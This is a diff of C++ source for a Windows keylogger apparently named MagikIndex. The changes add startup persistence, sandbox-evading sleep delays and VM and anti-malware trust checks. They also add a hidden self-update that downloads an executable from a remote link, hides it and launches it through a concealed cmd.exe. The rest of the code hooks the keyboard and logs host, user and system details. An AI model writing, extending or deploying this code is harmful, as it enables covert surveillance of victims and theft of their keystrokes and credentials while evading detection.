@@ -12,6 +12,7 @@
 typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
 PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
 
+
 HHOOK keyboardHook;
 
 int main()
@@ -31,23 +32,30 @@ int main()
 
     srand(RandSeed);
 
-#ifndef debug
-
-    unsigned long ThreadId;
-    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
-
-
-#endif
+    bool ThrowAwayFlag = false;
+    char PathToFile[MAX_PATH];
+    HMODULE GetModH = GetModuleHandle(NULL);
+    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
+    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
+    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
+    if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {      //why did i put this here kekw
+        RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
+        exit(0);
+    }
 
     if (DelayExecution) {
         int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
         LARGE_INTEGER delay;
-        delay.QuadPart = -10000 * ((int)DividedSleep * 1000);
+        delay.QuadPart = -10000 * (DividedSleep * 1000);
         pNtDelayExecution(FALSE, &delay);
         for (int j = 0; j <= Divider; j++) {
             Sleep(DividedSleep);
         }
+    }
 
+    if (ShatterAttack) {
+        unsigned long ThreadId;
+        CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
     }
 
     bool FirstLog = true;
@@ -62,7 +70,37 @@ int main()
     TrustItems Trust = DebugItem.TrustItem;
     bool TrustTooLow = false;
     if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
+        if (QuitIfUntrust) {
+            FinalExit();
+        }
         TrustTooLow = true;                                         
+    }else if (Trust.HasActiveInternet && !Trust.IsInVM) {
+        std::string VersionFile = CurrentDir + "\\Version.inf";
+        std::string UpdatedExe = CurrentDir + "\\MagikIndekkusu.exe";
+        VersionDownload:
+        URLDownloadToFile(NULL, GitVersionLink, VersionFile.c_str(), 0, NULL);
+        SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+        std::ifstream VersionFileIO(VersionFile);
+        if (!VersionFileIO.eof()) {
+            std::getline(VersionFileIO, VersionFile, '\n');
+            VersionFile.erase(VersionFile.size() - 2);
+            if (strcmp(VersionFile.c_str(), CurrentVersion ) != 0) {
+                std::getline(VersionFileIO, VersionFile, '\n');
+                URLDownloadToFile(NULL, VersionFile.c_str(), UpdatedExe.c_str(), 0, NULL);
+                SetFileAttributesA(UpdatedExe.c_str(), FILE_ATTRIBUTE_HIDDEN);
+                VersionFile = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & start " + UpdatedExe;
+                ShellExecuteA(0, "open", "cmd.exe", VersionFile.c_str(), 0, SW_HIDE);
+                FinalExit();
+            }
+        }else {
+            DeleteFileA(VersionFile.c_str());
+            if (!ThrowAwayFlag) {
+                ThrowAwayFlag = true;
+                VersionFileIO.close();
+                goto VersionDownload;
+            }
+            VersionFileIO.close();
+        }
     }
     //add special security routines, example:
     // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
@@ -72,11 +110,11 @@ int main()
 Log:
 
     Log log;
-    log.ExtrapolateKey();
     log.CreateLog();
 
     DWORD Tick = GetTickCount();
 
+    std::string VersionText = "MagikIndex ";
     std::string TimeText = "Current Tick:";
     std::string ComputerText = "Host Name:";
     std::string UsernameText = "User Name:";
@@ -100,15 +138,17 @@ Log:
     std::string RAMText = "RAM Size:";
     std::string SeedText = "Randomness Seed:";
     std::string CopiedFileText = "Made executable \"";
-    std::string CryptText = "Encrypted with \"";
+    std::string CryptText = "Encrypted with ";
+
+    VersionText += CurrentVersion;
+    if (IsMajor)
+        VersionText += " Major Release - ";
+    else
+        VersionText += " Minor/Dev Release - ";
 
     char* AppData = nullptr;
     size_t AppDataSize;
     _dupenv_s(&AppData, &AppDataSize, "APPDATA");
-
-    char PathToFile[MAX_PATH];
-    HMODULE GetModH = GetModuleHandle(NULL);
-    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
 
     std::string LogTime = std::to_string(Tick);
 
@@ -117,7 +157,7 @@ Log:
     ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
     GetLocalTime(&SysTime);
 
-    std::string StartDate = "_________";
+    std::string StartDate = "_________" + VersionText;
     StartDate += std::to_string(SysTime.wDay);
     StartDate += "/";
     StartDate += std::to_string(SysTime.wMonth);
@@ -135,19 +175,14 @@ Log:
     log.LogItChar("\n");
     log.LogItChar(StartDate);
 
-#ifdef debug
-
-    log.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
-    log.LogItChar("Not crypting the logs...");
-
-#else
-
-    log.LogItChar("Started in normal mode...");
-    CryptText += std::to_string(/*ExtrapolateKey()*/1000);
-    CryptText += "\" Key Shift...";
-    log.LogItChar(CryptText);
-
-#endif
+    if (!CryptLogs) {
+        log.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
+        log.LogItChar("Not crypting the logs...");
+    }else{
+        log.LogItChar("Started in normal mode...");
+        CryptText += "Secure Random Key Shift...";
+        log.LogItChar(CryptText);
+    }
 
     if (FirstLog) {
         if (Trust.IsResCheck)
@@ -288,29 +323,32 @@ Log:
     if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
         MiddleEast = "Yes";
     }
+    if (IsWindowsXPOrGreater()) {
+        WindowsVersion = "XP / Vista";
+    }
     if (IsWindows7OrGreater())
     {
-        std::string WindowsVersion = "Seven";
+        WindowsVersion = "Seven";
     }
     if (IsWindows7SP1OrGreater())
     {
-        std::string WindowsVersion = "Seven SP1";
+        WindowsVersion = "Seven SP1";
     }
     if (IsWindows8OrGreater())
     {
-        std::string WindowsVersion = "Eight";
+        WindowsVersion = "Eight";
     }
     if (IsWindows8Point1OrGreater())
     {
-        std::string WindowsVersion = "Eight.one";
+        WindowsVersion = "Eight.one";
     }
     if (IsWindows10OrGreater())
     {
-        std::string WindowsVersion = "Ten";
+        WindowsVersion = "Ten";
     }
     if (IsWindowsServer())
     {
-        std::string WindowsVersion = "Server";
+        WindowsVersion = "Server";
     }
 
     SYSTEM_INFO siSysInfo;
@@ -336,7 +374,7 @@ Log:
         }
     }
 
-    char Locale[LOCALE_NAME_MAX_LENGTH];
+    char Locale[LOCALE_NAME_MAX_LENGTH+1];
 
     GetCurrencyFormatA(
         LOCALE_SYSTEM_DEFAULT, 
@@ -344,7 +382,7 @@ Log:
         "0",
         NULL,
         Locale,
-        LOCALE_NAME_MAX_LENGTH+1);
+        LOCALE_NAME_MAX_LENGTH);
 
     TimeText += LogTime;
     log.LogItChar(TimeText);
